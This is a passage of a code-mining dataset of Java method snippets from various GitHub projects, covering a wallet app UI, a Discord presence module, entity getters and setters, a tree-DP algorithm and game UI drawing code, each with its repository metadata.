null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBatteryChange(int percentage) {\n        batteryPercent = percentage;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/views/UpdatingHelper.java", "stars": "13", "class_props": {"extends": null, "implements": ["OnBatteryChangeListener"], "modifiers": ["public"]}}, {"id": 55079, "method_name": "registerBroadcastReceiver", "class_name": "UpdatingHelper", "params": ["Context"], "throws": null, "modifiers": ["private"], "return_type": "BroadcastReceiver", "snippet": "    private BroadcastReceiver registerBroadcastReceiver(@NonNull Context context) {\n        Preconditions.checkNotNull(context);\n        final IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);\n        final BroadcastReceiver receiver = new BatteryView.BatteryReceiver(this);\n        context.registerReceiver(receiver, filter);\n        return receiver;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/views/UpdatingHelper.java", "stars": "13", "class_props": {"extends": null, "implements": ["OnBatteryChangeListener"], "modifiers": ["public"]}}, {"id": 55080, "method_name": "onEnable", "class_name": "DiscordRPC", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEnable() {\n        DiscordRPC.LIB = club.minnced.discord.rpc.DiscordRPC.INSTANCE;\n        this.lastTime = System.currentTimeMillis() / 1000L;\n        final String applicationId = \"670676274338988042\";\n        final DiscordEventHandlers handlers = new DiscordEventHandlers();\n        DiscordRPC.LIB.Discord_Initialize(applicationId, handlers, true, \"\");\n        new Thread(() -> {\n            while (!Thread.currentThread().isInterrupted()) {\n                this.presence = new DiscordRichPresence();\n                this.presence.startTimestamp = lastTime;\n                this.presence.largeImageText = String.format(\"%s %s | 1.12.2\", Mercury.INSTANCE.getName(), Mercury.INSTANCE.getVersion());\n                this.presence.largeImageKey = String.format(\"name_%s_\", MathUtil.getRandom(1, 50));\n                this.presence.smallImageKey = \"discord\";\n                this.presence.smallImageText = \"https://discord.io/mercurymod\";\n           //     for (String devs : devs) {\n           //         if (mc.session.getProfile().getId().toString().equals(devs)) {\n            //            this.presence.smallImageKey = \"dev\";\n            //            this.presence.smallImageText = Trident.INSTANCE.getProfileManager().getName(UUID.fromString(devs));\n            //        }\n           //     }\n                    this.presence.details = (afk || mc.currentScreen instanceof GuiMainMenu || mc.currentScreen instanceof GuiMultiplayer) ? \"Currently AFK\" : \"Currently Exploring\";\n                serverData = mc.getCurrentServerData();\n                if (serverData != null) {\n                    StringBuilder sb = new StringBuilder(\"Multiplayer\");\n                    if (this.server)\n                        sb.append(\": \" + serverData.serverIP);\n                    if (name)\n                        sb.append(String.format(\" (%s)\", mc.getSession().getUsername()));\n                    this.presence.state = sb.toString();\n                } else if (mc.isSingleplayer()) {\n                    this.presence.state = \"Singleplayer\";\n                } else if (mc.currentScreen != null) {\n                    if (mc.currentScreen instanceof GuiMainMenu) {\n                        this.presence.state = \"Main Menu\";\n                    }\n                    if (mc.currentScreen instanceof GuiMultiplayer) {\n                        this.presence.state = \"Multiplayer\";\n                    }\n                }\n                DiscordRPC.LIB.Discord_UpdatePresence(this.presence);\n                DiscordRPC.LIB.Discord_RunCallbacks();\n                try {\n                    Thread.sleep(5000L);\n                } catch (InterruptedException ignored) {\n                    ignored.printStackTrace();\n                }\n            }\n        }, \"RPC-Callback-Handler\").start();\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/misc/DiscordRPC.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 55081, "method_name": "onUpdate", "class_name": "DiscordRPC", "params": ["UpdateEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUpdate(UpdateEvent event) {\n        if (MotionUtil.getSpeed(Objects.requireNonNull(mc.player)) == 0.0) {\n            if (timer.hasReached(10000))\n            afk = true;\n        } else {\n            timer.reset();\n            afk = false;\n        }\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/modules/misc/DiscordRPC.java", "stars": "12", "class_props": {"extends": "Module", "implements": null, "modifiers": ["public"]}}, {"id": 55082, "method_name": "getExecNodeId", "class_name": "ExecNodeUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getExecNodeId() {\n        return execNodeId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55083, "method_name": "setExecNodeId", "class_name": "ExecNodeUser", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExecNodeId(Integer execNodeId) {\n        this.execNodeId = execNodeId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55084, "method_name": "getExecUser", "class_name": "ExecNodeUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getExecUser() {\n        return execUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55085, "method_name": "setExecUser", "class_name": "ExecNodeUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExecUser(String execUser) {\n        this.execUser = execUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55086, "method_name": "getRelationState", "class_name": "ExecNodeUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRelationState() {\n        return relationState;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55087, "method_name": "setRelationState", "class_name": "ExecNodeUser", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRelationState(int relationState) {\n        this.relationState = relationState;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55088, "method_name": "getUid", "class_name": "ExecNodeUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getUid() {\n        return uid;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55089, "method_name": "setUid", "class_name": "ExecNodeUser", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUid(Integer uid) {\n        this.uid = uid;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55090, "method_name": "getGid", "class_name": "ExecNodeUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getGid() {\n        return gid;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55091, "method_name": "setGid", "class_name": "ExecNodeUser", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGid(Integer gid) {\n        this.gid = gid;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55092, "method_name": "isMarkDel", "class_name": "ExecNodeUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isMarkDel() {\n        return markDel;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55093, "method_name": "setMarkDel", "class_name": "ExecNodeUser", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMarkDel(boolean markDel) {\n        this.markDel = markDel;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55094, "method_name": "getUpdateTime", "class_name": "ExecNodeUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getUpdateTime() {\n        return updateTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55095, "method_name": "setUpdateTime", "class_name": "ExecNodeUser", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUpdateTime(Date updateTime) {\n        this.updateTime = updateTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55096, "method_name": "getUserType", "class_name": "ExecNodeUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUserType() {\n        return userType;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55097, "method_name": "setUserType", "class_name": "ExecNodeUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUserType(String userType) {\n        this.userType = userType;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecNodeUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55098, "method_name": "maxHappy1", "class_name": "Code09_MaxHappy", "params": ["Employee"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int maxHappy1(Employee boss) {\n\t\tif (boss == null) {\n\t\t\treturn 0;\n\t\t}\n\t\treturn process1(boss, false);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code09_MaxHappy.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55099, "method_name": "process1", "class_name": "Code09_MaxHappy", "params": ["Employee", "boolean"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int process1(Employee cur, boolean up) {\n\t\tif (up) {\n\t\t\tint ans = 0;\n\t\t\tfor (Employee next : cur.nexts) {\n\t\t\t\tans += process1(next, false);\n\t\t\t}\n\t\t\treturn ans;\n\t\t} else {\n\t\t\tint p1 = cur.happy;\n\t\t\tint p2 = 0;\n\t\t\tfor (Employee next : cur.nexts) {\n\t\t\t\tp1 += process1(next, true);\n\t\t\t\tp2 += process1(next, false);\n\t\t\t}\n\t\t\treturn Math.max(p1, p2);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code09_MaxHappy.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55100, "method_name": "maxHappy2", "class_name": "Code09_MaxHappy", "params": ["Employee"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int maxHappy2(Employee boss) {\n\t\tif (boss == null) {\n\t\t\treturn 0;\n\t\t}\n\t\tInfo all = process2(boss);\n\t\treturn Math.max(all.yes, all.no);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code09_MaxHappy.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55101, "method_name": "process2", "class_name": "Code09_MaxHappy", "params": ["Employee"], "throws": null, "modifiers": ["public", "static"], "return_type": "Info", "snippet": "\tpublic static Info process2(Employee x) {\n\t\tif (x.nexts.isEmpty()) {\n\t\t\treturn new Info(x.happy, 0);\n\t\t}\n\t\tint yes = x.happy;\n\t\tint no = 0;\n\t\tfor (Employee next : x.nexts) {\n\t\t\tInfo nextInfo = process2(next);\n\t\t\tyes += nextInfo.no;\n\t\t\tno += Math.max(nextInfo.yes, nextInfo.no);\n\t\t}\n\t\treturn new Info(yes, no);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code09_MaxHappy.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55102, "method_name": "genarateBoss", "class_name": "Code09_MaxHappy", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "Employee", "snippet": "\tpublic static Employee genarateBoss(int maxLevel, int maxNexts, int maxHappy) {\n\t\tif (Math.random() < 0.02) {\n\t\t\treturn null;\n\t\t}\n\t\tEmployee boss = new Employee((int) (Math.random() * (maxHappy + 1)));\n\t\tgenarateNexts(boss, 1, maxLevel, maxNexts, maxHappy);\n\t\treturn boss;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code09_MaxHappy.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55103, "method_name": "genarateNexts", "class_name": "Code09_MaxHappy", "params": ["Employee", "int", "int", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void genarateNexts(Employee e, int level, int maxLevel, int maxNexts, int maxHappy) {\n\t\tif (level > maxLevel) {\n\t\t\treturn;\n\t\t}\n\t\tint nextsSize = (int) (Math.random() * (maxNexts + 1));\n\t\tfor (int i = 0; i < nextsSize; i++) {\n\t\t\tEmployee next = new Employee((int) (Math.random() * (maxHappy + 1)));\n\t\t\te.nexts.add(next);\n\t\t\tgenarateNexts(next, level + 1, maxLevel, maxNexts, maxHappy);\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code09_MaxHappy.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55104, "method_name": "main", "class_name": "Code09_MaxHappy", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tint maxLevel = 4;\n\t\tint maxNexts = 7;\n\t\tint maxHappy = 100;\n\t\tint testTimes = 100000;\n\t\tfor (int i = 0; i < testTimes; i++) {\n\t\t\tEmployee boss = genarateBoss(maxLevel, maxNexts, maxHappy);\n\t\t\tif (maxHappy1(boss) != maxHappy2(boss)) {\n\t\t\t\tSystem.out.println(\"Oops!\");\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"finish!\");\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class08/Code09_MaxHappy.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55105, "method_name": "setView", "class_name": "SetupSyncFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int setView() {\n        return R.layout.setup_sync;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/setup/SetupSyncFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 55106, "method_name": "init", "class_name": "SetupSyncFragment", "params": ["View"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init(View view) {\n        super.init(view);\n        mBinding.complete.setOnClickListener(this::complete);\n        SetupVaultViewModel model = ViewModelProviders.of(mActivity).get(SetupVaultViewModel.class);\n        subscribe(model.getCoins());\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/setup/SetupSyncFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 55107, "method_name": "complete", "class_name": "SetupSyncFragment", "params": ["View"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void complete(View view) {\n        navigate(R.id.action_to_setupCompleteFragment);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/setup/SetupSyncFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 55108, "method_name": "subscribe", "class_name": "SetupSyncFragment", "params": ["LiveData<List>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void subscribe(LiveData<List<CoinEntity>> coins) {\n        coins.observe(this, this::generateSyncData);\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/setup/SetupSyncFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 55109, "method_name": "generateSyncData", "class_name": "SetupSyncFragment", "params": ["List<CoinEntity>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void generateSyncData(List<CoinEntity> coinEntities) {\n        ViewModelProviders.of(mActivity).get(CoinListViewModel.class)\n                .generateSync(coinEntities).observe(this, sync -> {\n            if (!TextUtils.isEmpty(sync)) {\n                mBinding.sync.qrcodeLayout.qrcode.setData(sync);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/ui/fragment/setup/SetupSyncFragment.java", "stars": "13", "class_props": {"extends": "SetupVaultBaseFragment", "implements": null, "modifiers": ["public"]}}, {"id": 55110, "method_name": "create", "class_name": "ViewHolderCart", "params": ["ViewGroup", "Context", "Fragment"], "throws": null, "modifiers": ["public", "static"], "return_type": "ViewHolderCart", "snippet": "    public static ViewHolderCart create(ViewGroup parent, Context context, Fragment fragment) {\n\n        View view = LayoutInflater.from(parent.getContext()).inflate(R.layout.list_item_cart, parent, false);\n        return new ViewHolderCart(view, context, fragment);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderCart.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": ["View"], "modifiers": ["public"]}}, {"id": 55111, "method_name": "setItem", "class_name": "ViewHolderCart", "params": ["CartStats"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItem(CartStats cartStats) {\n        this.cartStats = cartStats;\n\n\n        String imagePath = \"http://example.com\";\n\n        Shop shop = cartStats.getShop();\n\n\n        itemsInCart.setText(cartStats.getItemsInCart() + \" Items in Cart\");\n        cartTotal.setText(\"Cart Total : \" + PrefGeneral.getCurrencySymbol(context) + \" \" + UtilityFunctions.refinedString(cartStats.getCart_Total()));\n\n\n        if (shop != null) {\n\n\n            deliveryCharge.setText(\"Delivery \" + PrefGeneral.getCurrencySymbol(context) + \" \" + shop.getDeliveryCharges() + \" Per Order\");\n            distance.setText(String.format(\"%.2f\", shop.getRt_distance()) + \" Km\");\n\n            shopName.setText(shop.getShopName());\n\n\n            if (shop.getPickFromShopAvailable()) {\n                pickFromShopIndicator.setVisibility(View.VISIBLE);\n            } else {\n                pickFromShopIndicator.setVisibility(View.GONE);\n            }\n\n\n\n            if (shop.getHomeDeliveryAvailable()) {\n                homeDeliveryIndicator.setVisibility(View.VISIBLE);\n            } else {\n                homeDeliveryIndicator.setVisibility(View.GONE);\n            }\n\n\n//            imagePath = UtilityGeneral.getImageEndpointURL(MyApplicationCoreNew.getAppContext())\n//                    + dataset.get(position).getShopDetails().getLogoImagePath();\n\n//            imagePath = UtilityGeneral.getServiceURL(context) + \"/api/v1/Shop/Image/three_hundred_\"\n//                    + shop.getLogoImagePath() + \".jpg\";\n\n            imagePath = PrefGeneral.getServiceURL(context) + \"/api/v1/Shop/Image/three_hundred_\"\n                    + shop.getLogoImagePath() + \".jpg\";\n\n        }\n\n\n        System.out.println(imagePath);\n\n        Drawable placeholder = VectorDrawableCompat\n                .create(context.getResources(),\n                        R.drawable.ic_nature_people_white_48px, context.getTheme());\n\n        Picasso.get()\n                .load(imagePath)\n                .placeholder(placeholder)\n                .into(shopImage);\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderCart.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": ["View"], "modifiers": ["public"]}}, {"id": 55112, "method_name": "onClick", "class_name": "ViewHolderCart", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View v) {\n\n        switch (v.getId())\n        {\n\n            case R.id.carts_list_item:\n\n                Intent intent = new Intent(context, CartItemList.class);\n\n//                    intent.putExtra(CartItemListFragment.SHOP_INTENT_KEY,dataset.get(getLayoutPosition()).getShopDetails());\n//                    intent.putExtra(CartItemListFragment.CART_STATS_INTENT_KEY,dataset.get(getLayoutPosition()));\n\n\n                String shopJson = UtilityFunctions.provideGson().toJson(cartStats.getShop());\n                intent.putExtra(CartItemListFragment.SHOP_INTENT_KEY,shopJson);\n\n\n                String cartStatsJson = UtilityFunctions.provideGson().toJson(cartStats);\n                intent.putExtra(CartItemListFragment.CART_STATS_INTENT_KEY,cartStatsJson);\n\n\n                context.startActivity(intent);\n\n                break;\n\n            default:\n\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderCart.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": ["View"], "modifiers": ["public"]}}, {"id": 55113, "method_name": "getFieldOrder", "class_name": "SemaphoreCreateRequest", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "List<String>", "snippet": "    protected List<String> getFieldOrder() {\n        return Arrays.asList(\"NDR\", \"policy\", \"value\");\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/kernel/SemaphoreCreateRequest.java", "stars": "16", "class_props": {"extends": "UnicornStructure", "implements": null, "modifiers": ["public"]}}, {"id": 55114, "method_name": "init", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        if (grayBackC == null)\n            initGradients();\n\n        // reset map everytime we open\n        sessionVar(\"SYSTEMUI_MAP_INITIALIZED\", false);\n        targetSystem = null;\n        map.clearRangeMap();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55115, "method_name": "clickSystem", "class_name": "SystemsUI", "params": ["StarSystem", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clickSystem(StarSystem v, int count) {\n\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55116, "method_name": "clickFleet", "class_name": "SystemsUI", "params": ["ShipFleet"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clickFleet(ShipFleet fl) {\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55117, "method_name": "drawBrownButton", "class_name": "SystemsUI", "params": ["Graphics2D", "String", "Rectangle", "Shape", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawBrownButton(Graphics2D g, String label, Rectangle actionBox, Shape hoverBox, int y) {\n        drawButton(g, brownBackC, label, actionBox, hoverBox, y);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55118, "method_name": "drawGrayButton", "class_name": "SystemsUI", "params": ["Graphics2D", "String", "Rectangle", "Shape", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawGrayButton(Graphics2D g, String label, Rectangle actionBox, Shape hoverBox, int y) {\n        drawButton(g, grayBackC, label, null, hoverBox, y);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55119, "method_name": "drawGreenButton", "class_name": "SystemsUI", "params": ["Graphics2D", "String", "Rectangle", "Shape", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawGreenButton(Graphics2D g, String label, Rectangle actionBox, Shape hoverBox, int y) {\n        drawButton(g, greenBackC, label, actionBox, hoverBox, y);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55120, "method_name": "drawRedButton", "class_name": "SystemsUI", "params": ["Graphics2D", "String", "Rectangle", "Shape", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawRedButton(Graphics2D g, String label, Rectangle actionBox, Shape hoverBox, int y) {\n        drawButton(g, redBackC, label, actionBox, hoverBox, y);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55121, "method_name": "drawButton", "class_name": "SystemsUI", "params": ["Graphics2D", "LinearGradientPaint", "String", "Rectangle", "Shape", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawButton(Graphics2D g, LinearGradientPaint gradient, String label, Rectangle actionBox, Shape hoverBox, int y) {\n        int buttonH = s27;\n        int x1 = s3;\n        int w1 = SIDE_PANE_W-s18;\n        if (actionBox != null)\n            actionBox.setBounds(x1,y,w1,buttonH);\n        g.setColor(SystemPanel.buttonShadowC);\n        g.fillRoundRect(x1+s1,y+s3,w1,buttonH,s8,s8);\n        g.fillRoundRect(x1+s2,y+s4,w1,buttonH,s8,s8);\n\n        g.setPaint(gradient);\n        g.fillRoundRect(x1,y,w1,buttonH,s5,s5);\n\n        boolean hovering = (actionBox != null) && (actionBox == hoverBox);\n        Color c0 = (actionBox == null) ? SystemPanel.grayText : hovering ? SystemPanel.yellowText : SystemPanel.whiteText;\n\n        g.setFont(narrowFont(18));\n        int sw = g.getFontMetrics().stringWidth(label);\n        int x0 = x1+((w1-sw)/2);\n        drawShadowedString(g, label, 3, x0, y+buttonH-s7, SystemPanel.textShadowC, c0);\n\n        g.setColor(c0);\n        Stroke prev2 = g.getStroke();\n        g.setStroke(stroke1);\n        g.drawRoundRect(x1+s1,y,w1-s2,buttonH,s5,s5);\n        g.setStroke(prev2);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55122, "method_name": "initGradients", "class_name": "SystemsUI", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initGradients() {\n        SIDE_PANE_W = scaled(250);\n        int w = getWidth();\n        int leftM = s2;\n        int rightM = w-s2;\n        Point2D start = new Point2D.Float(leftM, 0);\n        Point2D end = new Point2D.Float(rightM, 0);\n        float[] dist = {0.0f, 0.5f, 1.0f};\n\n        Color brownEdgeC = new Color(100,70,50);\n        Color brownMidC = new Color(161,110,76);\n        Color[] brownColors = {brownEdgeC, brownMidC, 